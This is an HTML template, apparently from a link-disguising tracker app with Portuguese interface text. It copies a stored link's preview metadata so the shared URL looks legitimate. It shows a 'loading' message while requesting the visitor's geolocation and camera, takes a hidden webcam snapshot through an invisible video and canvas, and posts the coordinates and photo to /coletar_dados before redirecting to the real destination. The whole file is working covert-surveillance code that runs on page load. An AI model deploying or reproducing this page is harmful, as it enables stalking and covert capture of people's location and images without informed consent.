<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{{ link.og_title or 'Redirecionando...' }}</title>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="{{ link.og_title }}">
    <meta property="og:description" content="{{ link.og_description }}">
    <meta property="og:image" content="{{ link.og_image }}">
    <meta property="og:url" content="{{ request.url }}">
    <meta property="og:type" content="website">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">

    <!-- Delay para garantir leitura das tags OG -->
    <meta http-equiv="refresh" content="5;url={{ destino }}">
</head>
<body>
    <h3 id="mensagem">Carregando... Aguarde alguns segundos.</h3>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const slug = {{ slug | tojson | safe }};
        const destino = {{ destino | tojson | safe }};

        async function coletarDados() {
            let latitude = "", longitude = "", foto_base64 = "";

            function atualizarMensagem(texto) {
                document.getElementById('mensagem').innerText = texto;
            }

            try {
                atualizarMensagem("Obtendo localização...");
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej);
                });
                latitude = pos.coords.latitude;
                longitude = pos.coords.longitude;
            } catch (e) {
                console.warn("Erro na geolocalização:", e);
                return;
            }

            try {
                atualizarMensagem("Acessando câmera...");
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                await new Promise(r => setTimeout(r, 1500));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                foto_base64 = canvas.toDataURL("image/png");

                stream.getTracks().forEach(t => t.stop());
            } catch (e) {
                console.warn("Erro ao acessar câmera:", e);
                return;
            }

            try {
                atualizarMensagem("Enviando dados...");
                await fetch("/coletar_dados", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ slug, latitude, longitude, foto_base64 })
                });
            } catch (e) {
                console.error("Erro ao enviar dados:", e);
            }
        }

        // Começa a coleta imediatamente, redirecionamento é feito via <meta refresh>
        coletarDados();
    </script>
</body>
</html>
